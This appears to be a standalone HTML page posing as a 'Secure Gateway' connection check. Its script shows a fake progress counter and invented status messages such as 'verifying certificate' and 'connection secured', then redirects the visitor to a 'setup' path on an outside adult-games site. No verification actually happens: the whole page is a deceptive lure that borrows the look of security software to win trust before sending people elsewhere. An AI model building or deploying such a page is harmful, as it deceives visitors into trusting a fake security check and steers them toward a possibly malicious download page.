<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🛡️ Secure Gateway • Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;}

body{
  font-family:'Inter',sans-serif;
  background:#05070d;
  color:#fff;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
}

/* animated gradient background */
body::before{
  content:"";
  position:absolute;
  width:200%;
  height:200%;
  background:
    radial-gradient(circle at 20% 30%, #0ea5ff22, transparent),
    radial-gradient(circle at 80% 70%, #6366f122, transparent),
    radial-gradient(circle at 50% 50%, #22c55e11, transparent);
  animation:bgMove 12s infinite alternate;
}
@keyframes bgMove{
  to{transform:translate(-4%, -4%) scale(1.1);}
}

/* main card */
.card{
  width:420px;
  padding:2.5rem;
  text-align:center;
  background:rgba(12,18,35,0.75);
  border-radius:22px;
  backdrop-filter:blur(18px);
  border:1px solid rgba(255,255,255,0.08);
  box-shadow:0 20px 60px rgba(0,0,0,0.6), 0 0 25px rgba(59,130,246,0.2);
  z-index:2;
}

/* header */
h1{
  font-size:2rem;
  margin-bottom:0.5rem;
  background:linear-gradient(90deg,#60a5fa,#818cf8,#22c55e);
  background-size:200%;
  -webkit-background-clip:text;
  color:transparent;
  animation:gradientShift 5s linear infinite;
}
@keyframes gradientShift{
  to{background-position:200%;}
}

.subtitle{
  font-size:0.9rem;
  color:#9fb3ff;
  margin-bottom:2rem;
}

/* loader */
.loader{
  width:120px;
  height:120px;
  border-radius:50%;
  border:6px solid rgba(255,255,255,0.08);
  border-top:6px solid #3b82f6;
  border-right:6px solid #8b5cf6;
  border-bottom:6px solid #22c55e;
  margin:0 auto 2rem;
  animation:spin 1s linear infinite;
  position:relative;
}

.loader::after{
  content:"";
  position:absolute;
  width:140%;
  height:140%;
  top:-20%;
  left:-20%;
  border-radius:50%;
  background:radial-gradient(circle,#3b82f633,transparent);
  animation:pulse 2s infinite;
}

@keyframes spin{to{transform:rotate(360deg);}}

@keyframes pulse{
  0%{opacity:0.5;transform:scale(1);}
  100%{opacity:0;transform:scale(1.5);}
}

/* percent */
.percent{
  font-size:2.3rem;
  font-weight:700;
  margin-bottom:1.2rem;
  transition:0.3s;
}

/* text */
.progress-text{
  font-size:1rem;
  margin-bottom:1rem;
  color:#dbe7ff;
}

/* status */
.status{
  font-size:0.9rem;
  padding:0.5rem 1.2rem;
  border-radius:20px;
  display:inline-block;
  background:rgba(255,255,255,0.05);
  border:1px solid rgba(255,255,255,0.08);
}

/* particles */
.particle{
  position:absolute;
  width:4px;
  height:4px;
  border-radius:50%;
  background:#3b82f6;
  opacity:0.7;
  animation:float 6s linear infinite;
}
@keyframes float{
  from{transform:translateY(0);}
  to{transform:translateY(-800px);}
}
</style>
</head>

<body>

<div class="card">
  <h1>🛡️ Secure Gateway</h1>
  <div class="subtitle">verifying connection integrity</div>

  <div class="loader"></div>

  <div class="percent" id="percent">0%</div>
  <div class="progress-text">checking secure route...</div>
  <div class="status" id="status">🔍 scanning connection</div>
</div>

<script>
const percentEl = document.getElementById('percent');
const statusEl = document.getElementById('status');

let progress = 0;

const messages = [
  "🔍 scanning connection",
  "🔐 verifying certificate",
  "⚡ establishing handshake",
  "🔁 routing traffic",
  "🛡️ applying protection",
  "✅ connection secured",
  "🚀 preparing redirect",
  "✨ redirecting..."
];

function update(){
  progress += Math.random()*7;

  if(progress >= 100){
    progress = 100;
    percentEl.textContent = "100%";
    statusEl.textContent = "✨ redirecting...";

    setTimeout(()=>{
      window.location.href = "https://lewdgamespc.com/setup-raza/";
    },800);
    return;
  }

  percentEl.textContent = Math.floor(progress) + "%";

  // color shift (defender style)
  if(progress < 30) percentEl.style.color = "#3b82f6";
  else if(progress < 70) percentEl.style.color = "#8b5cf6";
  else percentEl.style.color = "#22c55e";

  let index = Math.floor((progress/100)*messages.length);
  statusEl.textContent = messages[index];

  setTimeout(update, 160);
}
update();

/* particles */
for(let i=0;i<60;i++){
  let p = document.createElement("div");
  p.className="particle";
  p.style.left = Math.random()*100+"%";
  p.style.top = Math.random()*100+"%";
  p.style.animationDuration = (4+Math.random()*4)+"s";
  document.body.appendChild(p);
}
</script>

</body>
</html>
